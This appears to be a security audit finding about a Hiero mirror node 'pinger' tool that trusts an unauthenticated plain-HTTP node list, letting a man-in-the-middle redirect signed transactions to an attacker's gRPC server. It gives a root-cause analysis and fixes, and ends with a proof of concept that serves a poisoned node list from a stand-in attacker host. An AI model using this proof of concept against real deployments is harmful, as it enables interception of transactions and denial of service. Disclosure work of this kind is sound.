### Title
Unauthenticated Mirror REST Response Allows Arbitrary gRPC Endpoint Injection via Unvalidated Node Network Map

### Summary
`fetchMirrorNodeNetwork` in `pinger/mirror_node_client.go` builds the entire Hiero SDK network map by blindly trusting the JSON response from the configured mirror REST endpoint over plain HTTP. No allowlist of valid node account IDs or endpoint addresses is enforced. An attacker who can control the mirror REST response (via MITM on the plain-HTTP connection or DNS poisoning) can inject arbitrary `node_account_id`/endpoint pairs — including spoofed entries for real consensus nodes — causing the SDK to route all signed transactions to attacker-controlled gRPC servers.

### Finding Description
**Code path:**

- `pinger/sdk_client.go`, `newClient()`, lines 18–22: when `cfg.network == "other"`, calls `buildNetworkFromMirrorNodes` and passes the result directly to `hiero.ClientForNetwork(netmap)` with no further validation.
- `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 74–131: issues a plain `http.Get` to `cfg.mirrorRest + "/api/v1/network/nodes"`, JSON-decodes the response into `nodesEnvelope`, and for every `nodeEntry` whose `node_account_id` is non-empty and parses successfully, maps every `service_endpoints` entry directly into the network map (lines 100–124).

**Root cause:** The only checks applied to the mirror response are:
1. `n.NodeAccountID == ""` — empty string guard (line 103).
2. `hiero.AccountIDFromString(n.NodeAccountID)` — syntactic parse only; any well-formed `X.Y.Z` string passes (line 107).
3. `host == "" || ep.Port == 0` — non-empty host/port guard (line 118).

There is no:
- TLS/certificate pinning on the mirror REST connection (the example URL and default are `http://mirror-rest:5551` — plain HTTP).
- Allowlist of expected node account IDs (e.g., only `0.0.3`–`0.0.28`).
- Validation that endpoint IPs/domains belong to known consensus nodes.
- Integrity check (signature, HMAC, etc.) on the response.

**Exploit flow:**
1. Attacker positions themselves to intercept or respond to the HTTP request to `cfg.mirrorRest` (MITM on the same network segment, ARP spoofing, or DNS poisoning of the mirror hostname).
2. Attacker returns a crafted `nodesEnvelope` JSON containing entries such as `{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"attacker-ip","port":50211}]}` — or any other node account ID including `0.0.2`.
3. `fetchMirrorNodeNetwork` accepts all entries without complaint and returns a map where `"attacker-ip:50211" → AccountID(0.0.3)`.
4. `hiero.ClientForNetwork(netmap)` is called with this poisoned map; the SDK now believes the attacker's server is the consensus node for `0.0.3`.
5. Every subsequent `cryptoTransfer.Execute(client)` in `transfer.go` (line 33) sends the fully-signed transaction to the attacker's gRPC endpoint.

### Impact Explanation
- **Transaction interception:** The attacker receives every signed `CryptoTransfer` transaction, exposing transaction content (parties, amounts, transaction IDs, operator account).
- **Selective denial of service:** The attacker can silently drop transactions or return gRPC errors, causing the pinger to log failures and retry — all retries also go to the attacker.
- **Fake receipt injection:** The attacker can return a crafted gRPC success response; `resp.GetReceipt(client)` would then query the mirror node (also attacker-controlled in this scenario) for a receipt that doesn't exist on-chain, producing misleading monitoring data.
- **Operator key exposure risk:** While the private key is not transmitted, the signed transaction bytes are, and repeated observation of signed transactions under a known key can aid offline analysis.
- Severity: **High** — full transaction routing hijack for the pinger's operator account.

### Likelihood Explanation
- **Precondition:** Attacker must be able to intercept or spoof the HTTP response from the mirror REST endpoint. This is realistic in:
  - Shared cloud/Kubernetes cluster networks (ARP spoofing, rogue pod).
  - Environments where the mirror node hostname resolves via mutable DNS (DNS poisoning, split-horizon DNS misconfiguration).
  - Deployments where `HIERO_MIRROR_PINGER_REST` points to an external or semi-trusted HTTP endpoint.
- The pinger calls `buildNetworkFromMirrorNodes` only at startup (`newClient` is called once in `main.go` line 41), so the attack window is the startup HTTP request — a single intercepted response is sufficient.
- No privileged access to the pinger process or its host is required; only network-level access to the path between the pinger and the mirror REST URL.

### Recommendation
1. **Enforce HTTPS with certificate validation** for `cfg.mirrorRest`; reject `http://` URLs or at minimum warn loudly. The `http.Client` in `fetchMirrorNodeNetwork` (line 46) should be configured with a strict TLS config.
2. **Allowlist valid node account IDs**: after parsing, reject any `node_account_id` not in a statically configured or well-known set of consensus node IDs for the target network.
3. **Validate endpoint addresses**: reject RFC-1918/loopback addresses and enforce that endpoints match expected IP ranges or domain suffixes for the network.
4. **Add response integrity**: consider requiring a signed or authenticated mirror response, or cross-validating the returned node list against a secondary trusted source before use.

### Proof of Concept
```
# 1. Start a fake mirror REST server returning a poisoned node list:
cat > fake_mirror.json <<'EOF'
{"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"<attacker-ip>","port":50211}]}],"links":{"next":null}}
EOF
python3 -m http.server 5551 &   # serves fake_mirror.json at /api/v1/network/nodes

# 2. Start a gRPC listener on attacker-ip:50211 to capture incoming transactions.

# 3. Launch the pinger with network=other pointing at the fake mirror:
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
HIERO_MIRROR_PINGER_TO=0.0.98 \
./pinger

# 4. Observe: all CryptoTransfer gRPC calls arrive at attacker-ip:50211.
#    The pinger's signed transactions are fully visible to the attacker.
```